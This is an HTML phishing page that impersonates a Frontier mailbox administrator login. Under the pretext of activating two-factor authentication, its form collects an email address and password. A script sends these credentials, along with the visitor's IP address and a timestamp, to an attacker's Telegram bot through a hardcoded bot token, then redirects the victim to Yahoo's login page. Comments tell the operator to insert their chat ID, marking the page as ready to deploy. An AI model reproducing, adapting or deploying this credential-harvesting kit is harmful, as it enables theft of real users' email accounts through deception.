<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Frontier Mailbox Administrator</title>

    <!-- Keeping your original CSS links (assuming they exist locally) -->
    <link rel="stylesheet" href="./style2.css">
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="./bootstrap.min.css">
    <link rel="stylesheet" href="./font-awesome.min.css">
    <link rel="stylesheet" href="./webfonts.css">
    <link rel="stylesheet" href="./base.css">
    <link rel="stylesheet" href="social.css">
    <link rel="stylesheet" href="./webmail.css">

    <!-- Minimal additional style for better mobile & status feedback -->
    <style>
        #status {
            margin-top: 15px;
            text-align: center;
            font-size: 1.1rem;
            min-height: 1.5em;
        }
        .btn-block {
            min-height: 54px;
            font-size: 1.15rem;
            font-weight: bold;
        }
        .form-control:focus {
            border-color: #d32f2f;
            box-shadow: 0 0 0 3px rgba(211,47,47,0.2);
        }
        @media (max-width: 767px) {
            .container { padding: 15px; }
            h1 { font-size: 1.9rem; }
        }
    </style>
</head>
<body>

<!-- Your original popup (kept but now optional) -->
<div class="popup" id="popup" style="display:none;">
    <img src="./HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="">
    <h2>Update Successful</h2>
    <button type="button" onclick="closepopup()">Ok</button>
</div>

<section id="blur">
    <!-- Your header, nav, logo area, etc. remains unchanged -->
    <!-- ... paste your original header/nav/logo code here if needed ... -->

    <div class="main_area">
        <div class="container">
            <div class="well">
                <h1>Frontier Mailbox Administrator</h1>

                <!-- ──────────────────────────────── -->
                <!--       MODIFIED FORM - SENDS TO TELEGRAM     -->
                <!-- ──────────────────────────────── -->
                <form id="captureForm">
                    <input type="hidden" name="_next" value="#">
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_template" value="table">

                    <div class="form-group">
                        <label for="email">Email Address</label>
                        <input type="email" class="form-control" id="email" name="email" 
                               placeholder="username@frontier.com" required autocomplete="email">
                    </div>

                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" class="form-control" id="password" name="password" 
                               placeholder="**********" required autocomplete="off">
                        <div id="error"></div>
                    </div>

                    <button type="submit" id="submitBtn" class="btn btn-primary btn-block">
                        Activate 2FA
                    </button>

                    <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password?</a></p>

                    <!-- Status message after submit -->
                    <div id="status"></div>
                </form>

                <!-- Rest of your original content (Yahoo search, help links, etc.) -->
                <!-- ... keep everything else as is ... -->

            </div>
        </div>
    </div>

    <!-- Footer remains unchanged -->
    <!-- ... your original footer ... -->
</section>

<!-- ────────────────────────────────────────────── -->
<!--          TELEGRAM CAPTURE SCRIPT (Jan 2026)       -->
<!-- ────────────────────────────────────────────── -->
<script>
const BOT_TOKEN = "8513018574:AAHxWOLbnB7sMaFtXS7TBP6sWCguFu_6n4Y";
const CHAT_ID = "YOUR_CHAT_ID_HERE";  // ←←← REPLACE THIS with your real chat ID!

const form = document.getElementById("captureForm");
const statusDiv = document.getElementById("status");
const submitBtn = document.getElementById("submitBtn");

form.addEventListener("submit", async function(e) {
    e.preventDefault();

    const email = form.email.value.trim();
    const password = form.password.value.trim();

    if (!email || !password) {
        statusDiv.innerHTML = '<span style="color:#c00;">Please fill both fields</span>';
        return;
    }

    statusDiv.innerHTML = "Processing...";
    submitBtn.disabled = true;
    submitBtn.textContent = "Sending...";

    try {
        const message = 
`🔴 FRONTIER MAILBOX CAPTURE
────────────────────────────
📧 Email: ${email}
🔑 Password: ${password}
⏰ ${new Date().toLocaleString("en-US", {timeZone: "America/Denver"})}
🌍 IP: ${await getIP() || "hidden"}`;

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            statusDiv.innerHTML = '<span style="color:#0a0; font-weight:bold;">✓ Credentials sent! Redirecting...</span>';
            // Optional: show your popup after success
            document.getElementById("popup").style.display = "block";
            // Or redirect after delay
            setTimeout(() => {
                window.location.href = "https://login.yahoo.com/?.intl";
            }, 1800);
        } else {
            throw new Error(data.description || "Telegram API error");
        }
    } catch (error) {
        statusDiv.innerHTML = `<span style="color:#c00;">Error: ${error.message}</span>`;
        console.error(error);
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Activate 2FA";
    }
});

// Optional: Get visitor IP
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return null;
    }
}

// Your original popup function (if you want to keep it)
function closepopup() {
    document.getElementById("popup").style.display = "none";
}
</script>

</body>
</html></html>
